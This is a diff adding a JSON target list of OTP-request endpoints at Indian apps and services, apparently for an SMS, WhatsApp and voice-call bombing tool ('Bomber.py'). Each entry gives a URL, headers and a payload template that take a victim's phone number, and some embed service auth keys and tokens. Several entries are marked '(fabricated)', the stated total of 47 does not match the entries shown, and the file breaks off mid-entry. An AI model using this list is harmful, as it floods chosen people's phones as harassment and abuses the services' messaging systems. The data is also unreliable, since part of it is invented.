@@ -1,0 +1,1848 @@
+{
+  "meta": {
+    "name": "kovak_filtered_endpoints",
+    "generated": "2026-10-08T00:00:00Z",
+    "total": 47
+  },
+  "endpoints": [
+    {
+      "id": "ep_2183",
+      "name": "Khatabook v1",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://api.khatabook.com/v1/auth/request-otp",
+      "phone_in": "body",
+      "phone_field": "phone",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json",
+        "x-kb-app-name": "khatabook",
+        "x-kb-app-version": "801800",
+        "x-kb-app-locale": "en",
+        "x-kb-platform": "android"
+      },
+      "payload_template": {
+        "phone": "{{phone}}",
+        "country_code": "+91",
+        "app_signature": "wk+avHrHZf2"
+      }
+    },
+    {
+      "id": "ep_2268",
+      "name": "Udaan",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://auth.udaan.com/api/otp/send?client_id=udaan-v2",
+      "phone_in": "body_form",
+      "phone_field": "mobile",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
+        "x-app-id": "udaan-auth"
+      },
+      "payload_template": "mobile={{phone}}"
+    },
+    {
+      "id": "ep_1575",
+      "name": "Udaan Send OTP 2",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://auth.udaan.com/api/otp/send",
+      "phone_in": "body_form",
+      "phone_field": "mobile",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "payload_template": "mobile={{phone}}"
+    },
+    {
+      "id": "ep_2191",
+      "name": "RummyCircle",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
+      "phone_in": "body",
+      "phone_field": "mobile",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "mobile": "{{phone}}",
+        "isPlaycircle": false
+      }
+    },
+    {
+      "id": "ep_2006",
+      "name": "RummyCircle v2 (fabricated)",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://www.rummycircle.com/api/v1/otp",
+      "phone_in": "body",
+      "phone_field": "mobile",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "mobile": "{{phone}}"
+      }
+    },
+    {
+      "id": "ep_2533",
+      "name": "Blinkit Accounts OTP",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://blinkit.com/v2/accounts/",
+      "phone_in": "body_form",
+      "phone_field": "user_phone",
+      "country_code": "+91",
+      "headers": {
+        "accept": "*/*",
+        "app_client": "consumer_web",
+        "auth_key": "c761ec3633c22afad934fb17a66385c1c06c5472b4898b866b7306186d0bb477",
+        "content-type": "application/x-www-form-urlencoded",
+        "origin": "https://blinkit.com",
+        "platform": "mobile_web"
+      },
+      "payload_template": {
+        "user_phone": "{{phone}}"
+      }
+    },
+    {
+      "id": "ep_2147",
+      "name": "Blinkit Voice (fabricated)",
+      "type": "call",
+      "method": "POST",
+      "url": "https://blinkit.com/api/v1/voice-otp",
+      "phone_in": "body",
+      "phone_field": "mobile",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "mobile": "{{phone}}"
+      }
+    },
+    {
+      "id": "ep_2534",
+      "name": "Blinkit SMS OTP (Tail)",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://api.blinkit.com/v1/auth/otp",
+      "phone_in": "body",
+      "phone_field": "phone",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0"
+      },
+      "payload_template": {
+        "phone": "{{phone}}",
+        "countryCode": "91"
+      }
+    },
+    {
+      "id": "ep_2535",
+      "name": "Blinkit SMS v1",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://blinkit.com/api/otp/generate",
+      "phone_in": "body",
+      "phone_field": "phone",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "phone": "{{phone}}"
+      }
+    },
+    {
+      "id": "ep_2385",
+      "name": "Blinkit OTP v2 (Bomber.py)",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://www.blinkit.com/api/v1/otp",
+      "phone_in": "body",
+      "phone_field": "phone",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "phone": "{{phone}}"
+      }
+    },
+    {
+      "id": "ep_2313",
+      "name": "FanCode",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://www.fancode.com/graphql",
+      "phone_in": "body_graphql",
+      "phone_field": "mobileNumber",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json",
+        "expcapability": "true",
+        "fc-device-type": "desktop",
+        "source": "fc-web"
+      },
+      "payload_template": {
+        "operationName": "RequestOTP",
+        "operation": "mutation",
+        "variables": {
+          "mobileNumber": "{{phone}}",
+          "pageName": "HomePageV2"
+        },
+        "query": "mutation RequestOTP($mobileNumber: String!, $email: String, $password: String) { requestAuthOTP(mobileNumber: $mobileNumber, email: $email, password: $password) { message success totalAttemptCount retryAfter remainingAttemptCount resendButtonActiveIn newUser email password } }"
+      }
+    },
+    {
+      "id": "ep_1741",
+      "name": "Tata Capital Business v2",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp",
+      "phone_in": "body",
+      "phone_field": "mobileNumber",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "mobileNumber": "{{phone}}",
+        "deviceOs": "Android",
+        "sourceName": "MitayeFaasleWebsite"
+      }
+    },
+    {
+      "id": "ep_2229",
+      "name": "Tata Capital Retail",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://retailonline.tatacapital.com/web/api/shaft/nli-otp/shaft-generate-otp/partner",
+      "phone_in": "body",
+      "phone_field": "mobileNumber",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "header": {
+          "authToken": "MTI4OjoxMDAwMDo6ZDBmN2I4MGNiODIyNWY2MWMyNzMzN2I3YmM0MmY0NmQ6OjZlZTdjYTcwNDkyMmZlOTE5MGVlMTFlZDNlYzQ2ZDVhOjpkdmJuR2t5QW5qUmV2OHV5UDdnVnEyQXdtL21HcUlCMUx2NVVYeG5lb2M0PQ==",
+          "identifier": "nli"
+        },
+        "body": {
+          "mobileNumber": "{{phone}}"
+        }
+      }
+    },
+    {
+      "id": "ep_2317",
+      "name": "Tata Capital Voice",
+      "type": "call",
+      "method": "POST",
+      "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
+      "phone_in": "body",
+      "phone_field": "phone",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "phone": "{{phone}}",
+        "isOtpViaCallAtLogin": "true"
+      }
+    },
+    {
+      "id": "ep_2435",
+      "name": "Jar",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://zeon-r.myjar.app/v1/pwa/zeon/authRequest?phoneNumber={{phone}}&countryCode=91&partnerId=undefined&captchaResponse=",
+      "phone_in": "url_query",
+      "phone_field": "phoneNumber",
+      "country_code": "+91",
+      "headers": {}
+    },
+    {
+      "id": "ep_0226",
+      "name": "MyJar Auth Request",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://zeon-r.myjar.app/v1/pwa/zeon/authRequest?phoneNumber={{phone}}&countryCode=91",
+      "phone_in": "url_query",
+      "phone_field": "phoneNumber",
+      "country_code": "+91",
+      "headers": {
+        "User-Agent": "Mozilla/5.0"
+      }
+    },
+    {
+      "id": "ep_2344",
+      "name": "Hungama OTP v3",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://communication.api.hungama.com/v1/communication/otp",
+      "phone_in": "body",
+      "phone_field": "mobileNo",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json",
+        "identifier": "home"
+      },
+      "payload_template": {
+        "mobileNo": "{{phone}}",
+        "countryCode": "+91",
+        "appCode": "un"
+      }
+    },
+    {
+      "id": "ep_2574",
+      "name": "CityMall OTP",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://citymall.live/api/cl-user/auth/get-otp",
+      "phone_in": "body",
+      "phone_field": "phone_number",
+      "country_code": "+91",
+      "headers": {
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://citymall.live",
+        "Referer": "https://citymall.live/"
+      },
+      "payload_template": {
+        "phone_number": "{{phone}}"
+      }
+    },
+    {
+      "id": "ep_2575",
+      "name": "CityMall Send OTP Web API",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://citymall.live/web-api/auth/send-otp",
+      "phone_in": "body",
+      "phone_field": "phone_number",
+      "country_code": "+91",
+      "headers": {
+        "accept": "application/json, text/plain, */*",
+        "content-type": "application/json",
+        "origin": "https://citymall.live"
+      },
+      "payload_template": {
+        "phone_number": "{{phone}}"
+      }
+    },
+    {
+      "id": "ep_1628",
+      "name": "Testbook Mobile Signup",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://api.testbook.com/api/v2/mobile/signup",
+      "phone_in": "body",
+      "phone_field": "mobile",
+      "country_code": "+91",
+      "headers": {
+        "accept": "application/json, text/plain, */*",
+        "content-type": "application/json",
+        "origin": "https://testbook.com",
+        "x-tb-client": "web,1.2"
+      },
+      "payload_template": {
+        "mobile": "{{phone}}",
+        "signupDetails": {
+          "page": "HomePage",
+          "pagePath": "/",
+          "pageType": "HomePage"
+        }
+      }
+    },
+    {
+      "id": "ep_2439",
+      "name": "Testbook",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://api.testbook.com/api/v2/mobile/signup?mobile={{phone}}&clientId=1117490662.1715447223&sessionId=1715447223",
+      "phone_in": "url_query",
+      "phone_field": "mobile",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json",
+        "x-tb-client": "web,1.2"
+      },
+      "payload_template": {
+        "mobile": "{{phone}}",
+        "signupDetails": {
+          "page": "HomePage",
+          "pagePath": "/",
+          "pageType": "HomePage"
+        }
+      }
+    },
+    {
+      "id": "ep_2274",
+      "name": "Unacademy",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://unacademy.com/api/v3/user/user_check/?enable-email=true",
+      "phone_in": "body",
+      "phone_field": "phone",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json",
+        "x-platform": "0"
+      },
+      "payload_template": {
+        "phone": "{{phone}}",
+        "country_code": "IN",
+        "otp_type": 1,
+        "email": "",
+        "send_otp": true,
+        "is_un_teach_user": false
+      }
+    },
+    {
+      "id": "ep_1485",
+      "name": "Unacademy Get App Link",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://unacademy.com/api/v1/user/get_app_link/",
+      "phone_in": "body",
+      "phone_field": "phone",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "phone": "{{phone}}"
+      }
+    },
+    {
+      "id": "ep_2279",
+      "name": "HDFC Ergo / here.co.in",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://here.co.in/users/v1/customer-portal/send-otp",
+      "phone_in": "body",
+      "phone_field": "mobile",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json",
+        "x-api-client": "Website",
+        "x-app-version-code": "182",
+        "x-origin": "https://sh.hdfcergo.com"
+      },
+      "payload_template": {
+        "mobile": "{{phone}}",
+        "source": "sms"
+      }
+    },
+    {
+      "id": "ep_2586",
+      "name": "Cosmofeed User Authenticate",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://prod.api.cosmofeed.com/api/user/authenticate",
+      "phone_in": "body",
+      "phone_field": "phoneNumber",
+      "country_code": "+91",
+      "headers": {
+        "accept": "application/json, text/plain, */*",
+        "content-type": "application/json",
+        "origin": "https://superprofile.bio"
+      },
+      "payload_template": {
+        "phoneNumber": "{{phone}}",
+        "countryCode": "+91",
+        "data": {
+          "email": "abcd2@gmail.com"
+        },
+        "authScreen": "signup-screen",
+        "userIsConvertingToCreator": false
+      }
+    },
+    {
+      "id": "ep_2269",
+      "name": "NoBroker v2",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://www.nobroker.in/api/v1/account/user/otp/send?otpM=true",
+      "phone_in": "body_form",
+      "phone_field": "phone",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+      },
+      "payload_template": "phone=%2B91{{phone}}"
+    },
+    {
+      "id": "ep_2174",
+      "name": "NoBroker SMS v1",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://www.nobroker.in/api/v3/account/otp/send",
+      "phone_in": "body_form",
+      "phone_field": "phone",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "payload_template": "phone={{phone}}&countryCode=IN"
+    },
+    {
+      "id": "ep_2166",
+      "name": "NoBroker WhatsApp (fabricated)",
+      "type": "whatsapp",
+      "method": "POST",
+      "url": "https://nobroker.in/v1/user/otplogin",
+      "phone_in": "body",
+      "phone_field": "phoneNumber",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "phoneNumber": "{{phone}}"
+      }
+    },
+    {
+      "id": "ep_2474",
+      "name": "Apna OTP Employer",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://production.apna.co/api/userprofile/v1/otp/",
+      "phone_in": "body",
+      "phone_field": "phone_number",
+      "country_code": "+91",
+      "headers": {
+        "accept": "application/json, text/plain, */*",
+        "content-type": "application/json",
+        "origin": "https://employer.apna.co"
+      },
+      "payload_template": {
+        "phone_number": "91{{phone}}",
+        "retries": 0,
+        "hash_type": "employer",
+        "source": "employer"
+      }
+    },
+    {
+      "id": "ep_2122",
+      "name": "WorkIndia v3",
+      "type": "sms",
+      "method": "GET",
+      "url": "https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={{phone}}",
+      "phone_in": "url_query",
+      "phone_field": "mobile_no",
+      "country_code": "+91",
+      "headers": {}
+    },
+    {
+      "id": "ep_2441",
+      "name": "WorkIndia v1",
+      "type": "sms",
+      "method": "GET",
+      "url": "https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={{phone}}&version_number=623",
+      "phone_in": "url_query",
+      "phone_field": "mobile_no",
+      "country_code": "+91",
+      "headers": {}
+    },
+    {
+      "id": "ep_2238",
+      "name": "Freedo Rentals",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://api.freedo.rentals/customer/sendOtpForSignUp",
+      "phone_in": "body",
+      "phone_field": "mobile_number",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json",
+        "platform": "web",
+        "requestfrom": "customer",
+        "x-bn": "2.0.16",
+        "x-channel": "WEB",
+        "x-client-id": "FREEDO",
+        "x-platform": "CUSTOMER"
+      },
+      "payload_template": {
+        "email_id": "test@example.com",
+        "first_name": "User",
+        "mobile_number": "{{phone}}"
+      }
+    },
+    {
+      "id": "ep_2180",
+      "name": "MyHubble Money",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://api.myhubble.money/v1/auth/otp/generate",
+      "phone_in": "body",
+      "phone_field": "phoneNumber",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "phoneNumber": "{{phone}}",
+        "channel": "SMS"
+      }
+    },
+    {
+      "id": "ep_2582",
+      "name": "ConfirmTkt",
+      "type": "sms",
+      "method": "GET",
+      "url": "https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={{phone}}",
+      "phone_in": "url_query",
+      "phone_field": "mobileNumber",
+      "country_code": "+91",
+      "headers": {}
+    },
+    {
+      "id": "ep_2583",
+      "name": "ConfirmTkt Register API",
+      "type": "sms",
+      "method": "GET",
+      "url": "https://securedapi.confirmtkt.com/api/platform/register",
+      "phone_in": "url_query",
+      "phone_field": "phone",
+      "country_code": "+91",
+      "headers": {}
+    },
+    {
+      "id": "ep_2584",
+      "name": "ConfirmTkt SMS Register",
+      "type": "sms",
+      "method": "GET",
+      "url": "https://securedapi.confirmtkt.com/api/platform/register?newOtp=true&mobileNumber={{phone}}",
+      "phone_in": "url_query",
+      "phone_field": "mobileNumber",
+      "country_code": "+91",
+      "headers": {}
+    },
+    {
+      "id": "ep_1375",
+      "name": "Vyapar Send OTP",
+      "type": "sms",
+      "method": "GET",
+      "url": "https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={{phone}}",
+      "phone_in": "url_query",
+      "phone_field": "mobile",
+      "country_code": "+91",
+      "headers": {}
+    },
+    {
+      "id": "ep_2123",
+      "name": "Vyapar v1",
+      "type": "sms",
+      "method": "GET",
+      "url": "https://vyaparapp.in/api/ftu/v3/send/otp?mobile={{phone}}",
+      "phone_in": "url_query",
+      "phone_field": "mobile",
+      "country_code": "+91",
+      "headers": {}
+    },
+    {
+      "id": "ep_2278",
+      "name": "PenPencil store",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://api.penpencil.co/v1/users/get-otp",
+      "phone_in": "body",
+      "phone_field": "username",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json",
+        "client": "hasura",
+        "client_type": "WEB",
+        "suborgid": "SUB-PWST002",
+        "version": "0.0.1"
+      },
+      "payload_template": {
+        "username": "{{phone}}",
+        "countryCode": "+91",
+        "organizationId": "5eb393ee95fab7468a79d189"
+      }
+    },
+    {
+      "id": "ep_2222",
+      "name": "PenPencil v2",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189?smsType=0",
+      "phone_in": "body",
+      "phone_field": "mobile",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json",
+        "origin": "https://www.pw.live",
+        "referer": "https://www.pw.live/",
+        "randomid": "e66d7f5b-7963-408e-9892-839015a9c83f"
+      },
+      "payload_template": {
+        "mobile": "{{phone}}",
+        "countryCode": "+91",
+        "subOrgId": "SUB-PWLI000"
+      }
+    },
+    {
+      "id": "ep_2177",
+      "name": "PenPencil v1",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
+      "phone_in": "body",
+      "phone_field": "mobile",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json",
+        "randomid": "42517571-2047-4b35-a6b9-c9b2687857f9",
+        "origin": "https://www.pw.live",
+        "referer": "https://www.pw.live/"
+      },
+      "payload_template": {
+        "organizationId": "5eb393ee95fab7468a79d189",
+        "mobile": "{{phone}}"
+      }
+    },
+    {
+      "id": "ep_2213",
+      "name": "PenPencil v3 Xylem",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348",
+      "phone_in": "body",
+      "phone_field": "mobile",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json",
+        "client-id": "64254d66be2a390018e6d348",
+        "client-type": "WEB",
+        "client-version": "300",
+        "randomId": "bfc4e54e-1873-48cc-823e-40d401d9dbb4"
+      },
+      "payload_template": {
+        "mobile": "{{phone}}",
+        "countryCode": "+91",
+        "firstName": "Anant Ambani"
+      }
+    },
+    {
+      "id": "ep_2270",
+      "name": "Vidyakul",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://vidyakul.com/signup-otp/send",
+      "phone_in": "body_form",
+      "phone_field": "phone",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
+      },
+      "payload_template": "phone={{phone}}"
+    },
+    {
+      "id": "ep_2307",
+      "name": "KukuFM",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://kukufm.com/api/v1/users/auth/send-otp/",
+      "phone_in": "body",
+      "phone_field": "phone_number",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "phone_number": "+91{{phone}}"
+      }
+    },
+    {
+      "id": "ep_2418",
+      "name": "LinkedIn OTP v2 (Bomber.py)",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://www.linkedin.com/api/v1/otp",
+      "phone_in": "body",
+      "phone_field": "phone",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "phone": "{{phone}}"
+      }
+    },
+    {
+      "id": "ep_1958",
+      "name": "LinkedIn SMS (fabricated)",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://www.linkedin.com/checkpoint/lg/login-submit",
+      "phone_in": "body_form",
+      "phone_field": "session_key",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded"
+      },
+      "payload_template": "session_key={{phone}}"
+    },
+    {
+      "id": "ep_0106",
+      "name": "LinkedIn SMS",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://www.linkedin.com/uas/verification/send-verification-code",
+      "phone_in": "body",
+      "phone_field": "phone",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json",
+        "User-Agent": "Mozilla/5.0"
+      },
+      "payload_template": {
+        "phone": "+91{{phone}}",
+        "country": "in"
+      }
+    },
+    {
+      "id": "ep_2345",
+      "name": "Meru Cabs OTP v3",
+      "type": "sms",
+      "method": "POST",
+      "url": "https://merucabapp.com/api/otp/generate",
+      "phone_in": "body_form",
+      "phone_field": "mobile_number",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "DeviceType": "Android"
+      },
+      "payload_template": "mobile_number={{phone}}"
+    },
+    {
+      "id": "ep_2334",
+      "name": "Rappi WhatsApp",
+      "type": "whatsapp",
+      "method": "POST",
+      "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
+      "phone_in": "body",
+      "phone_field": "phone",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "country_code": "+91",
+        "phone": "{{phone}}"
+      }
+    },
+    {
+      "id": "ep_2342",
+      "name": "Rappi WhatsApp OTP v2",
+      "type": "whatsapp",
+      "method": "POST",
+      "url": "https://services.rappi.com/api/rappi-authentication/login/whatsapp/create",
+      "phone_in": "body",
+      "phone_field": "phone",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "phone": "{{phone}}",
+        "country_code": "+91"
+      }
+    },
+    {
+      "id": "ep_2444",
+      "name": "KPN WhatsApp",
+      "type": "whatsapp",
+      "method": "POST",
+      "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate",
+      "phone_in": "body",
+      "phone_field": "phone_number",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json",
+        "x-app-id": "32178bdd-a25d-477e-b8d5-60df92bc2587"
+      },
+      "payload_template": {
+        "notification_channel": "WHATSAPP",
+        "phone_number": {
+          "country_code": "+91",
+          "number": "{{phone}}"
+        }
+      }
+    },
+    {
+      "id": "ep_1707",
+      "name": "KPN WhatsApp v2",
+      "type": "whatsapp",
+      "method": "POST",
+      "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
+      "phone_in": "body",
+      "phone_field": "phone_number",
+      "country_code": "+91",
+      "headers": {
+        "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
+        "content-type": "application/json; charset=UTF-8"
+      },
+      "payload_template": {
+        "notification_channel": "WHATSAPP",
+        "phone_number": {
+          "country_code": "+91",
+          "number": "{{phone}}"
+        }
+      }
+    },
+    {
+      "id": "ep_2335",
+      "name": "Eka Care WhatsApp",
+      "type": "whatsapp",
+      "method": "POST",
+      "url": "https://auth.eka.care/auth/init",
+      "phone_in": "body",
+      "phone_field": "mobile",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "payload": {
+          "allowWhatsapp": true,
+          "mobile": "+91{{phone}}"
+        },
+        "type": "mobile"
+      }
+    },
+    {
+      "id": "ep_2332",
+      "name": "Stratzy WhatsApp",
+      "type": "whatsapp",
+      "method": "POST",
+      "url": "https://stratzy.in/api/web/whatsapp/sendOTP",
+      "phone_in": "body",
+      "phone_field": "phoneNo",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "phoneNo": "{{phone}}"
+      }
+    },
+    {
+      "id": "ep_2336",
+      "name": "Dream11 WhatsApp",
+      "type": "whatsapp",
+      "method": "POST",
+      "url": "https://www.dream11.com/auth/passwordless/init",
+      "phone_in": "body",
+      "phone_field": "phoneNumber",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json",
+        "device": "pwa",
+        "x-device-identifier": "macos"
+      },
+      "payload_template": {
+        "channel": "whatsapp",
+        "flow": "SIGNUP",
+        "phoneNumber": "{{phone}}",
+        "templateName": "default"
+      }
+    },
+    {
+      "id": "ep_2331",
+      "name": "Foxy WhatsApp",
+      "type": "whatsapp",
+      "method": "POST",
+      "url": "https://www.foxy.in/api/v2/users/send_otp",
+      "phone_in": "body",
+      "phone_field": "phone_number",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "user": {
+          "phone_number": "+91{{phone}}"
+        },
+        "via": "whatsapp"
+      }
+    },
+    {
+      "id": "ep_2443",
+      "name": "Jockey WhatsApp",
+      "type": "whatsapp",
+      "method": "GET",
+      "url": "https://www.jockey.in/apps/jotp/api/login/send-otp/+91{{phone}}?whatsapp=true",
+      "phone_in": "url_path",
+      "phone_field": "phone",
+      "country_code": "+91",
+      "headers": {}
+    },
+    {
+      "id": "ep_1710",
+      "name": "Jockey WhatsApp Resend",
+      "type": "whatsapp",
+      "method": "GET",
+      "url": "https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{{phone}}?whatsapp=true",
+      "phone_in": "url_path",
+      "phone_field": "phone",
+      "country_code": "+91",
+      "headers": {}
+    },
+    {
+      "id": "ep_2160",
+      "name": "Amazon WhatsApp (fabricated)",
+      "type": "whatsapp",
+      "method": "POST",
+      "url": "https://amazon.in/gw/login-register/v1/sendOTP",
+      "phone_in": "body",
+      "phone_field": "mobile",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "mobile": "{{phone}}"
+      }
+    },
+    {
+      "id": "ep_2163",
+      "name": "Paytm WhatsApp (fabricated)",
+      "type": "whatsapp",
+      "method": "POST",
+      "url": "https://paytm.com/v1/user/otplogin",
+      "phone_in": "body",
+      "phone_field": "mobileNumber",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "mobileNumber": "{{phone}}"
+      }
+    },
+    {
+      "id": "ep_2161",
+      "name": "Swiggy WhatsApp (fabricated)",
+      "type": "whatsapp",
+      "method": "POST",
+      "url": "https://swiggy.com/v1/user/otplogin",
+      "phone_in": "body",
+      "phone_field": "phoneNumber",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "phoneNumber": "{{phone}}"
+      }
+    },
+    {
+      "id": "ep_2162",
+      "name": "Zomato WhatsApp (fabricated)",
+      "type": "whatsapp",
+      "method": "POST",
+      "url": "https://zomato.com/gw/login-register/v1/sendOTP",
+      "phone_in": "body",
+      "phone_field": "mobile",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "mobile": "{{phone}}"
+      }
+    },
+    {
+      "id": "ep_2165",
+      "name": "Rapido WhatsApp (fabricated)",
+      "type": "whatsapp",
+      "method": "POST",
+      "url": "https://rapido.bike/api/v2/login/sendotp",
+      "phone_in": "body",
+      "phone_field": "phoneNumber",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "phoneNumber": "{{phone}}"
+      }
+    },
+    {
+      "id": "ep_2164",
+      "name": "Meesho WhatsApp (fabricated)",
+      "type": "whatsapp",
+      "method": "POST",
+      "url": "https://meesho.com/gw/login-register/v1/sendOTP",
+      "phone_in": "body",
+      "phone_field": "number",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "number": "{{phone}}",
+        "otpOnCall": true
+      }
+    },
+    {
+      "id": "ep_2159",
+      "name": "Flipkart WhatsApp (fabricated)",
+      "type": "whatsapp",
+      "method": "POST",
+      "url": "https://flipkart.com/api/v2/auth/send-otp",
+      "phone_in": "body",
+      "phone_field": "phoneNumber",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "phoneNumber": "{{phone}}"
+      }
+    },
+    {
+      "id": "ep_2329",
+      "name": "Zivame Voice",
+      "type": "call",
+      "method": "POST",
+      "url": "https://api.zivame.com/v2/customer/login/send-otp",
+      "phone_in": "body",
+      "phone_field": "phone_number",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "phone_number": "{{phone}}",
+        "otp_type": "voice"
+      }
+    },
+    {
+      "id": "ep_2328",
+      "name": "Uber Voice",
+      "type": "call",
+      "method": "POST",
+      "url": "https://auth.uber.com/v2/voice-otp",
+      "phone_in": "body",
+      "phone_field": "phone",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "phone": "+91{{phone}}"
+      }
+    },
+    {
+      "id": "ep_2327",
+      "name": "Ola Voice",
+      "type": "call",
+      "method": "POST",
+      "url": "https://api.olacabs.com/v1/voice-otp",
+      "phone_in": "body",
+      "phone_field": "phone",
+      "country_code": "+91",
+      "headers": {
+        "Content-Type": "application/json"
+      },
+      "payload_template": {
+        "phone": "{{phone}}"
+      }
+    },
+    {
+      "id": "ep_2323",
